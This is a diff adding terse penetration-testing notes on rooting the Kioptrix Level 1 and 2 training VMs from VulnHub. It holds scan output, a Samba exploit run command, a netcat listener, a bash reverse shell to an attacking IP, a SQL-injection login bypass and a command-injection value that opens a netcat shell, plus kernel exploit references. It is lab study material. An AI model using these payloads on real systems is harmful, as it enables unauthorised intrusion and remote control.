@@ -1,0 +1,77 @@
+### This doc has hacks of kioptrix machines on vulnhub ###
+
+1. Level 1
+
+System : CentOS 4.5
+
+Nmap : 
+
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+1024/tcp open  status      1 (RPC #100024)
+
+enum4linux
+===========================================
+| Share Enumeration on 192.168.33.133 |
+===========================================
+WARNING: The “syslog” option is deprecated
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+Hack : (Directly got the root)
+
+SMB on port 139 (Samba 2.2.1 is vulnerable)
+exploit : https://www.exploit-db.com/exploits/10/
+Compile and run : ./smb-exploit -b 0 192.168.1.1  ## Run command ## 
+
+
+## For Direct terminal root prompt ##
+
+Setup listener 
+nc -nlvp 4444
+
+Use this command to connect back to our attacking box.
+bash -i >& /dev/tcp/192.168.33.129/4444 0>&1
+
+
+
+2. Level 2
+
+System details : Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+
+Nmap : 
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind  2 (RPC #100000)
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+631/tcp  open  ipp      CUPS 1.1
+3306/tcp open  mysql    MySQL (unauthorized)
+
+Hack : 
+
+Sqlinjection on index.php page
+
+Sql Injection Code : admin' or 1=1#
+Complete list of Sqlinjection Bypass login : https://github.com/apoorv1126/Offensive-Security/blob/master/SQLinjection-logiBypass
+
+In the text box type the code as shown below : 
+localhost; /usr/local/bin/nc 192.168.5.1 1234 -e /bin/bash  ## "localhost" to ping as code execute after that only ""
+
+Priv escalation : 
+
+Linex kernal used 2.6.9
+Exploit used : https://www.exploit-db.com/exploits/9479/
+Compilation : gcc 9479.c
+
+- Alternate exploit : https://www.exploit-db.com/exploits/9542/ 
+
+
+
+
+
+
